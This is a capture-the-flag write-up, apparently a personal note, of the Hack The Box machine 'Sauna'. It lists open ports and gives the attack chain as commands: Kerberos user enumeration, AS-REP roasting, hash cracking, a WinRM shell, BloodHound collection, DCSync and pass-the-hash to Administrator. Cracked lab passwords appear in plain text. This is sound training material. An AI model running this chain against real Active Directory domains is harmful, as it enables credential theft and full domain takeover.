202301220938
Status: #idea
Tags:

# Sauna
IP: 10.10.10.175

## Recon

Ports Open:

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown
```

Port 80:

- We could not find much information or data through smb or other services
- After trying to bruteforce directories on the website, we did not find anything of interest
- However, we did discover names that are part of the team, which could lead to possible users

![[sauna_users.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/sauna_users.png">

- We then created a `users.txt` file where we wrote assumed different types of naming conventions, ex: `fsmith or f.smith`
- We did this for each user until we were satisfied with our different types
- We then used kerbrute to enumerate users with our file

```bash
kerbrute userenum --dc '$IP' -d '$DOMAIN' -v users.txt
```

- We were able to find a valid user `fsmith`

![[sauna_validuser.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/sauna_validuser.png">

## Establish Foothold

- We can now try to retrieve a hash for this user by ASREProasting

```bash
GetNPUsers.py -usersfile validuser.txt -outputfile hash.txt -dc-ip $IP $DOMAIN/
```

- Now we have the user `fsmith` and his hash
- We can crack this hash with hashcat

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

- We now have valid credentials: `fsmith:Thestrokes23`
- We can now get a shell with evil-winrm

```bash
evil-winrm -i $IP -u $USER -p $PASS -s $PATHTOSCRIPTS
```

- We now upload winPEAS to do some enumeration
- Winpeas returns autologon credentials, `svc_loanmgr:Moneymakestheworldgoround!`
- Now we can enumerate the AD enviroment with bloodhound
- We upload `SharpHound.ps1` to be able to collect data for bloodhound

```powershell
Import-Module ./Sharphound.ps1
Invoke-Bloodhound -CollectionMethod All -ZipFileName data
```

## Escalate Privileges

- We then download the zip file onto our attacker machine and upload it to bloodhound to analyze all the data
- One quick and interesting find was that the user `svc_loanmgr` had a permission that allowed for a DCSync attack
- With this information, we can pass our valid credentials to secretsdump.py to dump hashes
- We now have our hashes, we can try to pass the hash for the `Administrator` account and see if we can get a shell

```bash
evil-winrm -i $IP -u Administrator -H $NTMLHASH
```

- We are now administrator and have owned this box









---
# References
